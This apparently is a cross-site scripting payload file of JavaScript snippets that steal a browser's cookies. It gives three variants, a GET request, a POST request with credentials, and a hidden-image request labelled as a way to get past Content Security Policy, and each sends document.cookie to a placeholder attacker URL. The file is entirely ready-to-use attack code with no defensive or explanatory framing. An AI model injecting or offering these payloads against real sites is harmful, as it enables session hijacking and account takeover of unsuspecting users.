// -- Basic

// GET
var cookies = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open("GET", "<URL>/?cookies=" + encodeURIComponent(cookies), true);
xhr.send();


// POST
var cookies = encodeURIComponent(document.cookie);
var xhr = new XMLHttpRequest();
xhr.open("POST", "<URL>/?cookie=" + cookies, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send("cookies=" + cookies);


// -- Bypass CSP

// Using an image 
var host = "<URL>"
var img = new Image();

img.onerror = function() {
    if(!img) return;
    img = undefined;
}
var cookies = encodeURIComponent(document.cookie);
img.onload = img.onerror;
img.src = host + "/?cookies=" + cookies;
img.style = "display: none;";

setTimeout(function() {
    if(!img) return;
    img = undefined;
}, 1);